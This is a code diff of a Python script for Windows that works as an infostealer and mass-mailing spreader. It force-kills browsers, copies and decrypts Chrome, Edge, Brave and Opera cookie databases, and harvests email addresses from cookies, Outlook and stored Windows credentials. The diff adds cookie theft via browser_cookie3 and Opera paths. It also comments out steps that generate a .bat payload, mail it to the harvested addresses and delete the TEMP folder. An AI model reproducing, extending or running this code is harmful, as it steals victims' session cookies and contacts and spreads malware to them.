@@ -6,6 +6,7 @@ import winreg
 import time
 import base64
 import getpass
+import browser_cookie3
 import requests, win32cred, win32com.client, socket, subprocess
 from win32.win32crypt import CryptUnprotectData
 from Crypto.Cipher.AES import new, MODE_GCM
@@ -17,7 +18,7 @@ from email.mime.text import MIMEText
 from email import encoders
 import ssl
 import urllib.parse
-from chardet import detect
+from charset_normalizer import from_bytes
 import plyvel
 import snappy
 import json
@@ -27,15 +28,17 @@ CHROME_BROWSER = 'chrome'
 EDGE_BROWSER = 'edge'
 BRAVE_BROWSER = 'brave'
 OPERAGX = 'operagx'
+OPERA_BROWSER = 'opera'
 chrome_path  = os.path.join(os.getenv('LOCALAPPDATA'),'Google', 'Chrome', 'User Data')
 edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
 brave_path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data')
 operagx_path = os.path.join(os.getenv('APPDATA'), 'Opera Software')
+opera_path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable')
 firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
 thunderbird_path = os.path.join(os.getenv('APPDATA'), 'thunderbird', 'Profiles')
-local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
+opera_local_state_path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local State')
 email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
-os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe /IM brave.exe /IM opera.exe >nul 2>&1")
+os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe /IM brave.exe /IM opera.exe /IM librewolf.exe >nul 2>&1")
 
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -161,16 +164,34 @@ Account Management Team"""
     print(len(emails))
 
 def decode_with_fallback(data):
-    for encoding in ['utf-8', 'utf-16-le', 'latin1']:
+    for encoding in ['utf-8', 'utf-16-le', 'latin-1']:
         try:
             return data.decode(encoding), encoding
         except:
             continue
-    encoding = detect(data)['encoding'] or 'utf-8'
+    encoding = from_bytes(data).best().encoding or 'utf-8'
     return data.decode(encoding, errors='replace'), encoding
 
 def bytes_to_hex(byte_data):
     return f"b'{''.join(f'\\x{byte:02x}' for byte in byte_data)}'"
+
+def decode_value(value):
+    decode_attempts = [
+        lambda x: x.decode('utf-8'),
+        lambda x: x.decode('latin-1'),
+        lambda x: urllib.parse.unquote(x.decode('latin-1')),
+        lambda x: base64.b64decode(x).decode('utf-8'),
+        lambda x: json.loads(x)
+    ]
+    
+    for attempt in decode_attempts:
+        try:
+            decoded = attempt(value)
+            if isinstance(decoded, dict):
+                decoded = json.dumps(decoded)
+        except:
+            continue
+    return decoded
 
 def get_decryption_key(local_state_path):
     with open(local_state_path, 'r') as f:
@@ -185,9 +206,9 @@ def decrypt_value(encrypted_value, key):
             cipher = new(key=key, mode=MODE_GCM, nonce=encrypted_value[3:15])
             decrypted_value = cipher.decrypt_and_verify(ciphertext=encrypted_value[15:-16], received_mac_tag=encrypted_value[-16:])
             # print(f"Decrypted cookie:\n  {bytes_to_hex(decrypted_value)}\n  {decrypted_value}")
-            return decrypted_value.decode()
+            return decode_value(decrypted_value[:-decrypted_value[-1]])
         except Exception as e:
-            print(f"Decryption failed: {e}")
+            print(f"Decryption failed using AES.GCM: {e}")
             return None
     else:
         try:
@@ -213,8 +234,8 @@ def extract_json(value_str):
         return value_str[json_start.start():]
     return value_str
 
-def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False, isopera=False):
-    if isopera: profiles=['Opera GX Stable']
+def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False, isoperagx=False):
+    if isoperagx: profiles=['Opera GX Stable']
     else: profiles = [f for f in os.listdir(chrome_path) if f.startswith('Profile') or f == 'Default']
     emails = []
 
@@ -350,25 +371,62 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                     print(f"Error processing URL {val[0]}: {e}")
             conn.close()
 
-        if isdecryptable:
-            cDatPath = os.path.join(chrome_path, profile, 'Network', 'Cookies')
-            tcDatPath = os.path.join(os.getenv('TEMP'), f"cDat_{USERNAME}_{profile_name}_{browser_name}.db")
-            if os.path.exists(cDatPath):
-                os.system(f'copy "{cDatPath}" "{tcDatPath}"')
-                conn = sqlite3.connect(tcDatPath)
-                cur = conn.cursor()
-                cur.execute("SELECT encrypted_value FROM cookies") # WHERE host_key LIKE '%@gmail%' OR host_key LIKE '%@outlook%' OR host_key LIKE '%mail%'
-                decryption_key = get_decryption_key(local_state_path)[1]
-                #print(decryption_key)
-                for val in cur.fetchall():
-                    encrypted_value = val[0]
-                    if encrypted_value is None or len(encrypted_value) == 0:
-                        continue
-                    print(encrypted_value)
-                    decrypted_value = decrypt_value(encrypted_value, decryption_key)
-                    print(decrypted_value)
+        cDatPath = os.path.join(chrome_path, profile, 'Network', 'Cookies')
+        tcDatPath = os.path.join(os.getenv('TEMP'), f"cDat_{USERNAME}_{profile_name}_{browser_name}.db")
 
-                conn.close()
+        if os.path.exists(cDatPath):
+            os.system(f'copy "{cDatPath}" "{tcDatPath}"')
+            try:
+                if browser_name == CHROME_BROWSER: cookies = browser_cookie3.chrome(cookie_file=tcDatPath)
+                elif browser_name == EDGE_BROWSER: cookies = browser_cookie3.edge(cookie_file=tcDatPath)
+                elif browser_name == OPERA_BROWSER: cookies = browser_cookie3.opera(cookie_file=tcDatPath)
+                elif browser_name == OPERAGX: cookies = browser_cookie3.opera_gx(cookie_file=tcDatPath)
+                elif browser_name == BRAVE_BROWSER: cookies = browser_cookie3.brave(cookie_file=tcDatPath)
+                print(browser_name, tcDatPath, cDatPath)
+                for cookie in cookies:
+                    decoded = cookie.value
+                    # print(f"{cookie.name} ::: {decoded}", '\n')
+                    # url decoding
+                    try: decoded = urllib.parse.unquote(decoded)
+                    except Exception as e: print(f"ERROR URL DECODING : {e}")
+
+                    #base64 decoding
+                    try:
+                        decoded_string, decoding = decode_with_fallback(base64.b64decode(decoded, validate=True))
+                        print(f"decoded with -> {decoding} and value -> {decoded_string}")
+
+                        if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
+                            print("IS JSOOOONNNNNNNNNNNNNN")
+                            emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
+                            
+                        continue
+                    except Exception as e: print(f"ERROR in BASE64 decoding : {e}")
+
+                    #json decoding
+                    try:
+                        if decoded.strip().startswith('{') or decoded.strip().startswith('['):
+                            emails.extend(find_emails_in_json(json.loads(decoded), email_pattern))
+                    except Exception as e:
+                        print(f"ERROR in json DECODING : {e}")
+                        print("USING DIRECT MATCHING")
+                        emails.extend(re.findall(email_pattern, decoded))
+
+            except Exception as e:
+                print(f"GET EXCEPTION WHILE GETTING COOKIES FOR {browser_name} :: {e}")
+                if isdecryptable:
+                    conn = sqlite3.connect(tcDatPath)
+                    cur = conn.cursor()
+                    cur.execute("SELECT encrypted_value FROM cookies") # WHERE host_key LIKE '%@gmail%' OR host_key LIKE '%@outlook%' OR host_key LIKE '%mail%'
+                    decryption_key = get_decryption_key(opera_local_state_path)[1]
+                    # print(decryption_key)
+                    for val in cur.fetchall():
+                        encrypted_value = val[0]
+                        if encrypted_value is None or len(encrypted_value) == 0:
+                            continue
+                        # print(encrypted_value)
+                        decrypted_value = decrypt_value(encrypted_value, decryption_key)
+                        print(decrypted_value, '\n')
+                    conn.close()
 
     return emails
 
@@ -528,20 +586,22 @@ emails = []
 #                 emails.extend(re.findall(email_pattern, data))
 #         except: pass
 
-if os.path.exists(chrome_path): chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
-if os.path.exists(edge_path): edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
-if os.path.exists(firefox_path): firefox_emails = firefox(firefox_path, email_pattern)
-if os.path.exists(thunderbird_path): thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
-if os.path.exists(brave_path): brave_emails = chromEdgeOnly(brave_path, email_pattern, BRAVE_BROWSER)
-if os.path.exists(operagx_path): gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isopera=True)
+# if os.path.exists(chrome_path): chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
+# if os.path.exists(edge_path): edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
+# if os.path.exists(firefox_path): firefox_emails = firefox(firefox_path, email_pattern)
+# if os.path.exists(thunderbird_path): thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
+# if os.path.exists(brave_path): brave_emails = chromEdgeOnly(brave_path, email_pattern, BRAVE_BROWSER)
+if os.path.exists(operagx_path): gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isoperagx=True)
+if os.path.exists(opera_path) : opera_mails = chromEdgeOnly(opera_path, email_pattern, OPERA_BROWSER, isdecryptable=True)
 
-# emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
-emails.extend(chrome_emails)
-emails.extend(edge_emails)
-emails.extend(firefox_emails)
-emails.extend(thunderbird_emails)
-emails.extend(brave_emails)
+# # emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
+# emails.extend(chrome_emails)
+# emails.extend(edge_emails)
+# emails.extend(firefox_emails)
+# emails.extend(thunderbird_emails)
+# emails.extend(brave_emails)
 emails.extend(gx_emails)
+emails.extend(opera_mails)
 
 try:
     # Method 1: Outlook COM API
@@ -578,9 +638,13 @@ except Exception as e:
     print(f"ERROR FETCHING WIN CREDS : {e}")
     
 emails = list(set(emails))
-bat_path = generate()
+# bat_path = generate()
 
 print("AFTER FILTERINGGG")
-send_a(bat_path, emails)
+#send_a(bat_path, emails)
 
-os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
+for email in emails:
+    print(email)
+print(len(emails))
+
+# os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
